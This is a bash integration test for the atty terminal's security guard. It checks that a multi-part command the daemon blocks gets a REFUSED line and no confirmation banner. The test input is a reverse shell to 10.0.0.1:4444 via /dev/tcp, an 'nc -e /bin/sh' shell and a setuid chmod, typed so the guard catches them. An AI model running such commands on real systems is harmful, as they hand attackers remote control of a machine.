#!/usr/bin/env bash
# End-to-end V2-J-2: atty + atty-guard with auto-Block enabled. User
# types a multi-atom command that the daemon escalates to Block. atty
# MUST refuse outright (red REFUSED line + Ctrl+U clear) instead of
# arming the [y]/[t]/cancel banner.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

GUARD_CONFIG=$(mktemp -t atty-block-guard.XXXXXX.toml)
cat > "$GUARD_CONFIG" <<TOML
[accumulator]
block_threshold = 0.9
TOML

start_guard --tier2 stub --config "$GUARD_CONFIG"
build_atty

mkdir -p "$REPO_ROOT/tests/integration/fixtures/build-tmp"
ATTY_CONFIG="tests/integration/fixtures/build-tmp/atty-block.zig"
trap 'rm -f "$REPO_ROOT/$ATTY_CONFIG" "$GUARD_CONFIG"; stop_guard' EXIT

cat > "$REPO_ROOT/$ATTY_CONFIG" <<ZIG
const atty = @import("atty");

pub const modules = .{
    atty.modules.security_guard.configure(.{
        .enabled = true,
        .daemon_socket_path = "$_GUARD_SOCKET",
        .trust_cache_path = "/tmp/atty-block-trust-${RANDOM}.txt",
    }),
};

pub const statusbar: atty.StatusBar = .{
    .enabled = true,
    .base_text = "atty",
};
ZIG

(cd "$REPO_ROOT" && zig build -Doptimize=ReleaseSafe -Dconfig="$ATTY_CONFIG" >/tmp/atty-block-build.log 2>&1) || {
    cat /tmp/atty-block-build.log >&2
    fail "atty build with daemon-socket config failed"
}

TMP_OUT=$(mktemp)
trap 'rm -f "$REPO_ROOT/$ATTY_CONFIG" "$GUARD_CONFIG" "$TMP_OUT"; stop_guard' EXIT

{
    sleep 0.5
    printf 'PS1="$ "\r'
    sleep 0.2
    # Three atoms — accumulator combines to > 0.9 → daemon returns Block.
    printf 'bash -i >& /dev/tcp/10.0.0.1/4444; nc -e /bin/sh; chmod +s /tmp/x'
    sleep 0.2
    printf '\r'
    sleep 0.8
    printf '\rexit\r'
} | script -qfec "$ATTY_BIN bash --norc --noprofile -i" "$TMP_OUT" >/dev/null 2>&1 || true

PLAIN=$(sed 's/\x1b\[[0-9;]*[a-zA-Z]//g; s/\x1b[\\(].//g; s/\x1b\][^\x07]*\x07//g' "$TMP_OUT")

# Block path emits "REFUSED — …" instead of the [y]/[t]/cancel banner.
if ! echo "$PLAIN" | grep -q "REFUSED"; then
    echo "--- captured (sanitized) ---" >&2
    echo "$PLAIN" | tail -15 >&2
    fail "expected 'REFUSED' line on daemon Block verdict"
fi
# And the [y]/[t]/cancel banner MUST NOT appear (that's the
# distinguisher from Warn).
if echo "$PLAIN" | grep -qE "\[y\]es once.*\[t\]rust"; then
    fail "expected NO banner prompt on Block (got [y]/[t]/cancel text)"
fi

pass "atty refuses outright on daemon Block (REFUSED line, no banner)"
